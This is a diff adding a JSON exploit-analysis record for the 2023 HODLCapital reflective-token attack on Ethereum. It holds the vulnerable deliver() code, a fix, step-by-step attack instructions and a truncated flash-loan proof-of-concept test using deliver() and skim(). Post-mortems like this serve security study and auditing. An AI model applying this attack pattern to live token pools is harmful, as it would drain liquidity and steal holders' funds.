@@ -1,0 +1,39 @@
+{
+ "id": "2023__2023-05-12_HODLCapital_ReflectiveDeliver",
+ "source_file": "2023/2023-05-12_HODLCapital_ReflectiveDeliver.md",
+ "title": "HODLCapital — Reflective Token `deliver()` Attack Analysis",
+ "date": "2023-05-12",
+ "protocol": "HODLCapital",
+ "chain": "Ethereum",
+ "loss_raw": "~2.3 ETH",
+ "loss_usd": null,
+ "root_cause": "Reflective token `deliver()` call induces LP reserve imbalance, exploited via `skim()`",
+ "attack_tx": "0xedc214a6...",
+ "vulnerable_contract": "0xEdA47E13...",
+ "classes": [
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "// ❌ Reflective deliver(): LP pair is not excluded\nfunction deliver(uint256 tAmount) public {\n    address sender = _msgSender();\n    require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n    (uint256 rAmount,,,,) = _getValues(tAmount);\n    _rOwned[sender] -= rAmount;\n    _rTotal -= rAmount;       // ❌ Total reflection pool decreases → LP pair's rOwned share increases\n    _tFeeTotal += tAmount;\n    // ❌ LP pair's reserve is not updated\n    // UniswapV2 pair.reserve0 < pair.balanceOf(address(pair)) imbalance occurs\n}",
+  "// File: HODLCapital.sol\n  function getReserves()  // ❌\n\n// ...\n\n  function quote(\n\n// ...\n\n  function getAmountOut(\n\n// ...\n\n  function getAmountIn(\n\n// ...\n\n  function deliver(uint256 tAmount) public {  // ❌\n    address sender = _msgSender();\n    require(\n      !_isExcluded[sender],\n      \"Excluded addresses cannot call this function\"\n    );\n    (uint256 rAmount, , , , , ) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rTotal = _rTotal.sub(rAmount);\n    _tFeeTotal = _tFeeTotal.add(tAmount);\n  }"
+ ],
+ "code_after": [
+  "// ✅ Fix: Add LP pair to excluded list, or call sync() after deliver\nfunction deliver(uint256 tAmount) public {\n    // Set LP pair as excluded to remove it from reflections\n    // Or call IUniswapV2Pair(lpPair).sync() after deliver\n}",
+  "// Add LP pair to excluded list\nfunction addLiquidityPair(address pair) external onlyOwner {\n    _isExcluded[pair] = true;  // ✅ Exclude from reflections\n    _excluded.push(pair);\n}"
+ ],
+ "steps": [
+  "1. Borrow 1000 WETH via Aave",
+  "2. Swap WETH → HODL (bulk buy)",
+  "3. Call HODL.deliver() repeatedly",
+  "→ LP pair's reflection balance",
+  "→ reserve vs balance imbalance",
+  "4. hodl_weth.skim(attacker)",
+  "→ Drain excess HODL tokens",
+  "5. Sell HODL → WETH",
+  "6. Repay flash loan + take profit"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────┐\n│  1. Borrow 1000 WETH via Aave       │\n│     flash loan                      │\n└─────────────────┬───────────────────┘\n                  ▼\n┌─────────────────────────────────────┐\n│  2. Swap WETH → HODL (bulk buy)     │\n└─────────────────┬───────────────────┘\n                  ▼\n┌─────────────────────────────────────┐\n│  3. Call HODL.deliver() repeatedly  │\n│     → LP pair's reflection balance  │\n│       increases                     │\n│     → reserve vs balance imbalance  │\n└─────────────────┬───────────────────┘\n                  ▼\n┌─────────────────────────────────────┐\n│  4. hodl_weth.skim(attacker)        │\n│     → Drain excess HODL tokens      │\n└─────────────────┬───────────────────┘\n                  ▼\n┌─────────────────────────────────────┐\n",
+  "function testExploit() external {\n    // 1. Borrow 1000 WETH via Aave flash loan\n    address[] memory assets = new address[](1);\n    assets[0] = address(weth);\n    uint256[] memory amounts = new uint256[](1);\n    amounts[0] = amount1000;\n    aavePool.flashLoan(address(this), assets, amounts, new uint256[](1), address(this), \"\", 0);\n}\n\nfunction executeOperation(\n    address[] calldata,\n    uint256[] calldata,\n    uint256[] calldata,\n    address,\n    bytes calldata\n) external returns (bool) {\n    // 2. Buy HODL with WETH\n    weth.approve(address(router), type(uint256).max);\n    swapWETHToHODL(amount1000);\n\n    uint256 hodlBalance = hodl.balanceOf(address(this));\n\n    // 3. Call deliver() repeatedly to create LP reserve imbalance\n    hodl.approve(address(hodl), hodlBalance);\n    hodl.deliver("
+ ]
+}
